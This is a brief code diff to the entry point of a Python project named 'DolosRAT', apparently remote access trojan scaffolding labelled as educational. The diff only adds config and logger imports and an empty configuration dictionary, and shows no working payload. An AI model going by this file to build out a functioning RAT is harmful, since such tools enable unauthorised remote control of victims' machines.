@@ -15,6 +15,11 @@ the use of this tool is for educational purposes only.
 import sys
 from typing import Any, Dict
 
+# Modules. 
+from config.config import Config
+from config.logger import get_logger_conf
+from utils.logger import LoggerWrapper, get_logger
+
 (__appname__,
  __author__,
  __licence__,
@@ -107,6 +112,11 @@ if __name__ == '__main__':
 
     # Houses configuration for 'DolosRAT' class.
     dolos_config: Dict[str, Any] = {}
+
+    # Populate 'dolos_config' with configurations.
+    dolos_config = {
+        
+    }
 
     # Application entry-point.
     DolosRAT(dolos_config)
